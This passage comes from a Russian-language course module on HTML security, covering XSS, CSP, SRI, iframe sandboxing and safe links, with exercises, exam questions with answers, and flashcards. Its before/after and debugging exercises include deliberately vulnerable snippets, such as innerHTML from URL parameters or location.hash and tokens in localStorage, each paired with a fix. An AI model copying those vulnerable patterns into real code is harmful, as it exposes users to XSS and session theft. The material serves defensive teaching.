    ]),

    section("related", [
      ul(
        "[Ссылки](/learn/html/links) — `target`, `rel`, `noopener`.",
        "[Встраиваемое содержимое](/learn/html/embedded-content) — `iframe`, `sandbox`, `allow`.",
        "[Хранение данных в браузере](/learn/html/web-storage) — cookie `HttpOnly`, XSS и хранилища.",
        "[Формы: отправка данных](/learn/html/forms-basics) — методы, CSRF, `enctype`.",
        "[Шаблоны и Custom Elements](/learn/html/templates-custom-elements) — безопасная вставка данных в компоненты.",
        "[Open Graph и структурированные данные](/learn/html/open-graph-structured-data) — экранирование JSON-LD.",
        "Из других курсов: **JS** — DOM API, `postMessage`, `fetch`; **HTTP** — заголовки безопасности, CORS, cookie; **Безопасность** — OWASP, CSRF, аутентификация.",
      ),
    ]),

    section("before-after", [
      beforeAfter(
        "html",
        {
          title: "Уязвимая страница",
          code: `
            <div id="out"></div>
            <script>
              out.innerHTML = "Привет, " + new URLSearchParams(location.search).get("name");
            </script>
            <a href="https://partner.example" target="_blank">Партнёр</a>
            <script src="https://cdn.example.org/lib.js"></script>
            <iframe src="https://widget.example.org"></iframe>
          `,
          note: "DOM-XSS из параметра URL; ссылка без `rel`; внешний скрипт без SRI; фрейм без ограничений.",
        },
        {
          title: "Защищённая страница",
          code: `
            <div id="out"></div>
            <script>
              document.getElementById("out").textContent =
                "Привет, " + (new URLSearchParams(location.search).get("name") ?? "гость");
            </script>
            <a href="https://partner.example" target="_blank" rel="noopener noreferrer">Партнёр</a>
            <script src="https://cdn.example.org/lib@1.2.3/lib.js" integrity="sha384-…" crossorigin="anonymous" defer></script>
            <iframe src="https://widget.example.org" title="Виджет" sandbox="allow-scripts" referrerpolicy="no-referrer"></iframe>
          `,
          note: "Текст вместо разметки; `rel`; SRI и фиксированная версия; `sandbox` и политика Referer.",
        },
      ),
    ]),
  ],

  exercises: [
    exercise({
      id: "html.html-security.ex1",
      title: "Найдите уязвимости",
      difficulty: "foundation",
      kind: "understanding",
      prompt: [
        p("Для каждого фрагмента назовите проблему и исправление:"),
        ol(
          "`div.innerHTML = '<p>' + comment.text + '</p>';`",
          "`<a href=\"${profile.site}\">Сайт</a>` (подстановка без проверки)",
          "`<a href=\"https://ext.example\" target=\"_blank\">Партнёр</a>` (для старых браузеров)",
          "`<script src=\"https://cdn.example.org/lib.js\"></script>`",
          "`<iframe src=\"${userUrl}\"></iframe>`",
          "`<script>window.__STATE__ = ${JSON.stringify(state)};</script>`",
          "Токен доступа хранится в `localStorage`.",
          "CSP: `script-src 'self' 'unsafe-inline'`.",
        ),
      ],
      hints: ["Что видит парсер HTML?", "Какие схемы URL опасны?", "Что даёт SRI?", "Что читает XSS?"],
      checks: ["Названы вид уязвимости и способ исправления для каждого пункта"],
      solution: [
        ol(
          "XSS через `innerHTML` → `textContent` или санитайзер.",
          "`javascript:`-URL → проверка схемы по белому списку, `rel`.",
          "Reverse tabnabbing в старых браузерах → `rel=\"noopener noreferrer\"`.",
          "Подмена файла на CDN → `integrity` + `crossorigin`, фиксированная версия.",
          "Пользовательский URL во фрейме → белый список, `sandbox`, `referrerpolicy`.",
          "`</script>` в данных закроет тег → экранировать `<` как `\\u003c` либо отдельный запрос/`application/json`.",
          "Кража токена XSS → `HttpOnly`-cookie и серверная сессия.",
          "`unsafe-inline` обнуляет защиту скриптов → nonce/хэши и `strict-dynamic`.",
        ),
      ],
    }),
    exercise({
      id: "html.html-security.ex2",
      title: "Составьте CSP для сайта",
      difficulty: "intermediate",
      kind: "application",
      prompt: [
        p("Сайт использует: собственные скрипты и стили; шрифты Google Fonts (`fonts.googleapis.com` для CSS и `fonts.gstatic.com` для файлов); картинки со своего CDN `https://img.example.com` и `data:`; API `https://api.example.com`; аналитику `https://stats.example.org/a.js`; встроенный блок JSON-LD; видео YouTube в `iframe`. Составьте CSP (строгую, но рабочую), объясните выбор и план внедрения."),
      ],
      hints: ["Как разрешить inline JSON-LD?", "Что такое Report-Only?", "Какие директивы закрывают базовые риски без списка разрешённых?"],
      checks: ["Нет `unsafe-inline` для скриптов", "`object-src 'none'`, `base-uri`, `frame-ancestors`", "Перечислены нужные источники", "План через Report-Only"],
      solution: [
        code(
          "text",
          `
          Content-Security-Policy:
            default-src 'self';
            script-src 'self' 'nonce-{random}' https://stats.example.org;
            style-src 'self' https://fonts.googleapis.com;
            font-src 'self' https://fonts.gstatic.com;
            img-src 'self' data: https://img.example.com;
            connect-src 'self' https://api.example.com;
            frame-src https://www.youtube-nocookie.com;
            object-src 'none';
            base-uri 'none';
            form-action 'self';
            frame-ancestors 'none';
            upgrade-insecure-requests
          `,
          { filename: "csp.txt" },
        ),
        ul(
          "**Inline JSON-LD** (`<script type=\"application/ld+json\">`) данными не исполняется и CSP на него не влияет; встроенный **исполняемый** код — только с `nonce`, сгенерированным на каждый ответ.",
          "**Аналитика** — явный источник в `script-src`; при возможности — self-hosting и SRI.",
          "**`frame-src`** разрешает только нужный видеохостинг (режим без cookie); **`frame-ancestors 'none'`** защищает от clickjacking.",
          "**`object-src 'none'`**, **`base-uri 'none'`**, **`form-action 'self'`** закрывают базовые риски.",
          "**Внедрение:** сначала `Content-Security-Policy-Report-Only` с `report-to`, собрать нарушения, исправить (inline-стили, обработчики), затем включить блокирующую политику; поддерживать в CI тест заголовков.",
        ),
      ],
    }),
    exercise({
      id: "html.html-security.ex3",
      title: "Виджет комментариев: найти и исправить",
      difficulty: "advanced",
      kind: "debugging",
      prompt: [
        p("В виджете комментариев нашли XSS: при открытии страницы у части посетителей открывается страница-фишинг, а в логах появляются запросы с cookie. Найдите причины в коде и исправьте: автор, текст, ссылка на сайт, аватар (URL), сохранение состояния."),
      ],
      starter: {
        lang: "js",
        code: `
          function render(c) {
            list.insertAdjacentHTML("beforeend",
              '<li><img src="' + c.avatar + '"><b>' + c.author + '</b>: ' + c.text +
              ' <a href="' + c.site + '" target="_blank">' + c.site + '</a></li>');
          }
          localStorage.setItem("session", token);
          app.innerHTML = location.hash.slice(1);
        `,
      },
      hints: ["Где данные попадают в атрибуты и текст?", "Какие схемы URL допустимы?", "Откуда берётся `location.hash`?", "Где хранить токен?"],
      checks: ["Нет `innerHTML` с данными", "URL проверены по белому списку", "`rel` у ссылки", "Токен не в `localStorage`", "DOM-XSS через hash устранён"],
      solution: [
        ul(
          "**Строка разметки из данных** (`insertAdjacentHTML`): `author`, `text`, `site`, `avatar` попадают в HTML/атрибуты — XSS.",
          "**`avatar` и `site`** без проверки схемы (`javascript:`, `data:`).",
          "**Ссылка `_blank` без `rel`.**",
          "**Токен в `localStorage`** доступен XSS.",
          "**`app.innerHTML = location.hash…`** — DOM-XSS из адреса.",
        ),
        code(
          "js",
          `
          function render(c) {
            const li = document.createElement("li");

            const img = document.createElement("img");
            img.alt = "";
            img.src = safeUrl(c.avatar, ["https:"]);

            const author = document.createElement("b");
            author.textContent = c.author;

            const text = document.createElement("span");
            text.textContent = c.text;

            li.append(img, author, ": ", text);

            const site = safeUrl(c.site, ["http:", "https:"]);
            if (site !== "#") {
              const a = document.createElement("a");
              a.href = site;
              a.textContent = new URL(site).hostname;
              a.target = "_blank";
              a.rel = "ugc nofollow noopener noreferrer";
              li.append(" ", a);
            }
            list.append(li);
          }

          function safeUrl(input, allowed) {
            try {
              const u = new URL(input, "https://example.com");
              return allowed.includes(u.protocol) ? u.href : "#";
            } catch { return "#"; }
          }

          // сессия — HttpOnly-cookie, ставит сервер; в JS токена нет
          app.textContent = decodeURIComponent(location.hash.slice(1));
          `,
          { lineNumbers: true, collapsed: true },
        ),
      ],
    }),
  ],

  challenge: {
    id: "html.html-security.challenge",
    title: "Безопасная система комментариев с форматированием и ссылками",
    scenario: [
      p("Платформа публикаций разрешает комментарии с форматированием (Markdown: жирный, курсив, списки, код, ссылки, изображения). Недавно пентест выявил хранимую XSS: через ссылку `javascript:` и атрибут изображения. Платформа обслуживает 2 млн посетителей в месяц; комментарии показываются на страницах статей и в письмах-уведомлениях."),
      p("Спроектируйте безопасный конвейер: от ввода до отображения. Определите модель угроз, правила санитизации, обработку ссылок и изображений, политику CSP/Trusted Types, изоляцию, тесты и мониторинг."),
    ],
    requirements: [
      "Модель угроз и точки, где данные становятся кодом",
      "Конвейер: Markdown → HTML → санитизация → вывод (где и когда выполняется каждый шаг)",
      "Правила для ссылок и изображений (схемы, `rel`, прокси/ограничения)",
      "CSP, Trusted Types, cookie и другие уровни защиты",
      "План тестирования (корпус нагрузок) и мониторинга, процесс реагирования",
    ],
    constraints: [
      "Нельзя доверять данным из базы",
      "Не использовать регулярные выражения для санитизации",
      "Письма-уведомления не должны содержать исполняемого содержимого",
    ],
    acceptance: [
      "Любой комментарий отображается без исполнения скриптов и обработчиков",
      "Ссылки только `http(s)`, с `rel=\"ugc nofollow noopener noreferrer\"`",
      "CSP блокирует inline-скрипты; нарушения собираются",
      "Тесты с корпусом XSS-нагрузок проходят в CI",
    ],
    hints: [
      "Где санитизировать: при сохранении или при выводе?",
      "Что делать с изображениями из внешних источников?",
      "Чем отличается вывод в HTML и в письмо?",
    ],
    solution: [
      ol(
        "**Модель угроз:** актор — аноним/зарегистрированный пользователь; цели — кража сессии, фишинг, спам-ссылки, трекинг через картинки, DoS большими вложенными структурами. Точки входа: поле комментария, имя, URL аватара/сайта, превью ссылок.",
        "**Хранение:** сохраняется **исходный Markdown** (источник истины) и версия правил санитизации; готовый HTML кэшируется отдельно и может быть пересчитан при обновлении правил.",
        "**Конвейер:** Markdown-парсер **с отключённым сырым HTML** → HTML → **санитайзер (DOMPurify на сервере/клиенте) с белым списком** (`p, br, strong, em, code, pre, ul, ol, li, blockquote, a`; атрибуты — только `href`) → пост-обработка ссылок → вывод.",
        "**Ссылки:** схемы только `http:`/`https:`/`mailto:`; `rel=\"ugc nofollow noopener noreferrer\"`, `target=\"_blank\"`; длина URL ограничена; отображается домен.",
        "**Изображения:** либо запретить, либо разрешить только `https`, через собственный **прокси/CDN** (проверка типа и размера, удаление метаданных, защита от трекинга и SSRF), с `width`/`height` и `loading=\"lazy\"`.",
        "**Письма:** отдельный шаблон: только текст и безопасные ссылки; без изображений по внешним URL; экранирование для HTML-контекста письма; текстовая версия письма.",
        "**CSP:** `script-src 'nonce-…' 'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `img-src 'self' https://img-proxy.example.com`; Trusted Types с одной политикой санитизации; запрет `eval`.",
        "**Cookie и сессия:** `HttpOnly; Secure; SameSite=Lax`; CSRF-токены для публикации комментариев; ограничение частоты (rate limit) и капча/анти-спам.",
        "**Изоляция:** пользовательский контент отображается в основном источнике **только** после санитизации; пользовательские файлы и превью — на отдельном домене.",
        "**Тесты:** корпус XSS-нагрузок (OWASP XSS Filter Evasion, polyglots, mXSS), property-based тесты на идемпотентность санитизации; e2e: проверка отсутствия выполнения (`window.__pwned` не устанавливается); проверка заголовков (CSP, nosniff, HSTS) в CI.",
        "**Мониторинг и реагирование:** CSP-отчёты (`report-to`), алерты на всплески; процесс: отключение комментариев/версии правил по флагу, пересчёт HTML, инструкция по инцидентам, публичная политика раскрытия уязвимостей (security.txt), bug bounty.",
      ),
      code(
        "js",
        `
        import { marked } from "marked";
        import DOMPurify from "dompurify";

        const ALLOWED = { ALLOWED_TAGS: ["p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "blockquote", "a"], ALLOWED_ATTR: ["href"] };

        DOMPurify.addHook("afterSanitizeAttributes", (node) => {
          if (node.tagName === "A") {
            const href = node.getAttribute("href") ?? "";
            try {
              const u = new URL(href, "https://example.com");
              if (!["http:", "https:", "mailto:"].includes(u.protocol)) { node.removeAttribute("href"); return; }
            } catch { node.removeAttribute("href"); return; }
            node.setAttribute("rel", "ugc nofollow noopener noreferrer");
            node.setAttribute("target", "_blank");
          }
        });

        export function renderComment(markdown) {
          // 1. Markdown → HTML (сырой HTML внутри Markdown экранируется/игнорируется)
          const html = marked.parse(markdown, { async: false });
          // 2. Санитизация по белому списку — всегда на выходе
          return DOMPurify.sanitize(html, ALLOWED);
        }
        `,
        { lineNumbers: true, filename: "render-comment.js", collapsed: true },
      ),
      ul(
        "**Идея эшелонирования:** даже если санитайзер пропустит ошибку, CSP без inline-скриптов и `HttpOnly`-cookie не позволят украсть сессию.",
        "**Что нельзя:** писать собственный санитайзер, разрешать произвольные атрибуты (`style`, `on*`, `srcset`), хранить уже «очищенный» HTML как единственную версию.",
        "**Метрики успеха:** ноль выполнившихся нагрузок в тестах, доля нарушений CSP, время реакции на инцидент.",
      ),
    ],
  },

  interview: [
    iq("html.html-security.i1", "basic", "Что такое XSS и какие бывают его виды?", [
      p("Внедрение чужого JavaScript в страницу вашего сайта: код выполняется в вашем источнике. Виды: хранимая (данные из базы), отражённая (из запроса) и DOM-based (клиентский код пишет данные в опасный приёмник вроде `innerHTML`)."),
    ]),
    iq("html.html-security.i2", "basic", "Чем `textContent` безопаснее `innerHTML`?", [
      p("`textContent` вставляет строку как **текст**, не разбирая разметки; `innerHTML` парсит строку как HTML, создавая элементы и обработчики событий. Недоверенные данные нужно вставлять через `textContent` (или санитизировать)."),
    ]),
    iq("html.html-security.i3", "intermediate", "Зачем `rel=\"noopener\"` у ссылок с `target=\"_blank\"`?", [
      p("Без него открытая страница получает `window.opener` и может перенаправить исходную вкладку (reverse tabnabbing). `noopener` обнуляет `opener`; `noreferrer` дополнительно скрывает `Referer`. Современные браузеры по умолчанию ведут себя как `noopener`, но явный `rel` — хорошая практика."),
    ]),
    iq("html.html-security.i4", "intermediate", "Что такое CSP и как она защищает от XSS?", [
      p("Политика, ограничивающая источники ресурсов и исполнение встроенного кода. Без `unsafe-inline` внедрённый inline-скрипт или обработчик будет заблокирован; `nonce`/хэши разрешают только свои скрипты. CSP — второй рубеж: уязвимость остаётся, но ущерб ограничен."),
    ]),
    iq("html.html-security.i5", "intermediate", "Что такое Subresource Integrity?", [
      p("Атрибут `integrity` (хэш `sha256/384/512`) у `script`/`link` и `crossorigin`: браузер сверяет загруженный файл с хэшем и не выполняет изменённый. Защищает от подмены файла на CDN, но не от выбора вредоносной библиотеки."),
    ]),
    iq("html.html-security.i6", "advanced", "Как безопасно разрешить пользователям форматирование в комментариях?", [
      ul(
        "Хранить исходник (Markdown), рендерить в HTML с отключённым сырым HTML.",
        "Санитизировать результат библиотекой по белому списку тегов и атрибутов.",
        "Обрабатывать ссылки: белый список схем, `rel=\"ugc nofollow noopener noreferrer\"`; изображения — через прокси или запретить.",
        "Дополнять CSP, Trusted Types, `HttpOnly`-cookie; тестировать корпусом нагрузок.",
      ),
    ]),
    iq("html.html-security.i7", "engineering", "Как внедрить строгую CSP на большом существующем сайте без поломок?", [
      ul(
        "Инвентаризация: inline-скрипты и стили, обработчики `on*`, сторонние источники, `eval`.",
        "Включить `Content-Security-Policy-Report-Only` с `report-to`, собрать нарушения.",
        "Переписать inline-код на внешние файлы/`nonce`, убрать `eval`, заменить обработчики на `addEventListener`.",
        "Включить блокирующую политику поэтапно (по разделам), следить за отчётами, добавить тесты заголовков в CI.",
      ),
    ]),
    iq("html.html-security.i8", "debugging", "В отчётах CSP много нарушений `script-src` от расширений браузеров. Как действовать?", [
      ul(
        "Отфильтровать шум по `source-file` и `blocked-uri` (`chrome-extension://`, `moz-extension://`).",
        "Сосредоточиться на нарушениях с вашими адресами и inline-кодом.",
        "Не ослаблять политику ради расширений; при необходимости группировать отчёты и строить дашборд.",
      ),
    ]),
  ],

  exam: [
    mcq("html.html-security.e1", "foundation", "Какой способ вставки недоверенного текста безопасен?", ["`el.innerHTML = s`", "`el.textContent = s`", "`document.write(s)`", "`eval(s)`"], 1, "`textContent` вставляет строку как текст, не создавая элементов и обработчиков."),
    mcq("html.html-security.e2", "foundation", "Какую схему URL нужно блокировать в пользовательских ссылках?", ["`https:`", "`mailto:`", "`javascript:`", "`tel:`"], 2, "`javascript:`-ссылка выполняет код по клику; безопасные схемы определяют белым списком."),
    mcq("html.html-security.e3", "intermediate", "Что делает `frame-ancestors 'none'` в CSP?", ["Запрещает встраивать ваши страницы в `iframe` на других сайтах", "Запрещает `iframe` на вашем сайте", "Разрешает `sandbox`", "Отключает скрипты"], 0, "Директива защищает от clickjacking: никто не сможет встроить вашу страницу во фрейм."),
    mcq("html.html-security.e4", "intermediate", "Какие утверждения верны? Выберите все.", ["`'unsafe-inline'` в `script-src` ослабляет защиту от XSS", "`nonce` должен быть новым для каждого ответа", "Регулярное выражение — надёжный санитайзер HTML", "`HttpOnly`-cookie недоступна JavaScript"], [0, 1, 3], "Санитизировать нужно парсером HTML по белому списку, а не регулярными выражениями."),
    mcq("html.html-security.e5", "intermediate", "Для чего нужен атрибут `integrity` у `<script>`?", ["Для ускорения загрузки", "Для проверки хэша файла (SRI)", "Для отключения CORS", "Для отключения кэша"], 1, "Браузер сверяет хэш загруженного файла и блокирует его при несовпадении."),
    mcq("html.html-security.e6", "advanced", "Почему комбинация `sandbox=\"allow-scripts allow-same-origin\"` опасна для недоверенного контента того же источника?", ["Она отключает формы", "Фрейм может снять с себя `sandbox` и получить полные права источника", "Она блокирует скрипты", "Она включает Trusted Types"], 1, "Если фрейм одного источника с родителем получает и скрипты, и общий источник, он может изменить собственный атрибут и убрать ограничения."),
    open("html.html-security.e7", "intermediate", "Объясните, почему экранирование зависит от контекста, и приведите три примера.", [
      ul(
        "Один и тот же символ опасен по-разному в разных местах разбора: в тексте опасно `<`, в значении атрибута — кавычка, в URL — схема, в JS — практически всё.",
        "Текст: `&lt;`/`&amp;` или `textContent`; атрибут: экранирование кавычек и значение в кавычках или `setAttribute`; URL: белый список схем и кодирование частей.",
        "Универсальной «одной функции» нет; поэтому используют шаблонизаторы с автоэкранированием и безопасные DOM API.",
      ),
    ], ["Названо различие контекстов", "Приведены три примера", "Предложены автоэкранирование и безопасные API"], { format: "concept" }),
  ],

  mastery: [
    mcq("html.html-security.m1", "intermediate", "Что безопаснее при хранении пользовательских комментариев с форматированием?", ["Хранить уже очищенный HTML как единственную версию", "Хранить исходник и санитизировать при выводе (с обновляемыми правилами)", "Не санитизировать", "Хранить в `localStorage`"], 1, "Исходник — источник истины; правила санитизации обновляются, и результат можно пересчитать."),
    mcq("html.html-security.m2", "advanced", "Что даёт Trusted Types?", ["Шифрование данных", "Запрет присваивать обычные строки опасным приёмникам; допускаются только значения, созданные политиками", "Ускорение рендеринга", "Блокировку cookie"], 1, "Механизм концентрирует риски в нескольких проверяемых политиках."),
    mcq("html.html-security.m3", "advanced", "Почему CSP не заменяет экранирование?", ["CSP медленная", "CSP — второй рубеж: ограничивает ущерб, но не устраняет уязвимость вывода", "CSP отключается пользователем", "CSP не работает на HTTPS"], 1, "Защита должна быть эшелонированной: правильный вывод данных плюс политика безопасности."),
    open("html.html-security.m4", "advanced", "Пентест показал, что в разделе профиля пользователь может подставить URL аватара `javascript:…` и `data:text/html,…`, а токен API лежит в `localStorage`. Разработчик предлагает «просто удалить слово javascript:» и закрыть вопрос. Что вы ответите?", [
      ul(
        "Чёрный список обходится (регистр, пробелы, вложенность, другие схемы, `data:`); нужен белый список схем (`https:`), разбор URL парсером и проверка итоговой схемы.",
        "Для аватара надёжнее хранить загруженный файл и отдавать собственный URL; ограничивать типы и размер.",
        "Токен из `localStorage` убрать: сессия — `HttpOnly; Secure; SameSite`-cookie; усилить CSP.",
        "Добавить тесты с корпусом нагрузок и мониторинг; зафиксировать правило в ревью-чек-листе.",
      ),
    ], ["Названа недостаточность чёрного списка", "Предложен белый список и безопасное хранение файла", "Предложены HttpOnly-cookie, CSP и тесты"], { format: "architecture" }),
  ],

  flashcards: [
    { id: "html.html-security.f1", front: "Главное правило против XSS?", back: "Данные — это текст: `textContent`, автоэкранирование, санитайзер для разметки." },
    { id: "html.html-security.f2", front: "Белый или чёрный список схем URL?", back: "Белый: `http:`, `https:`, `mailto:`, `tel:`. Проверять через `new URL`." },
    { id: "html.html-security.f3", front: "CSP без `unsafe-inline`?", back: "`nonce`/хэши + `strict-dynamic`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors`." },
    { id: "html.html-security.f4", front: "Ссылка наружу?", back: "`rel=\"noopener noreferrer\"`; пользовательская: `ugc nofollow noopener noreferrer`." },
    { id: "html.html-security.f5", front: "Защита от clickjacking?", back: "`Content-Security-Policy: frame-ancestors 'none'` (и `X-Frame-Options` для старых)." },
    { id: "html.html-security.f6", front: "SRI?", back: "`integrity=\"sha384-…\" crossorigin=\"anonymous\"`: браузер сверяет хэш внешнего файла." },
  ],

  sources: [
    { title: "OWASP: Cross Site Scripting Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", publisher: "Other" },
    { title: "OWASP: Content Security Policy Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html", publisher: "Other" },
    { title: "MDN: Content Security Policy (CSP)", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP", publisher: "MDN" },
    { title: "MDN: Subresource Integrity", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity", publisher: "MDN" },
    { title: "MDN: <iframe> sandbox attribute", url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox", publisher: "MDN" },
    { title: "HTML Living Standard — Link types: noopener, noreferrer", url: "https://html.spec.whatwg.org/multipage/links.html#link-type-noopener", publisher: "WHATWG" },
    { title: "web.dev: Trusted Types", url: "https://web.dev/articles/trusted-types", publisher: "Other" },
    { title: "DOMPurify", url: "https://github.com/cure53/DOMPurify", publisher: "Other" },
  ],
};
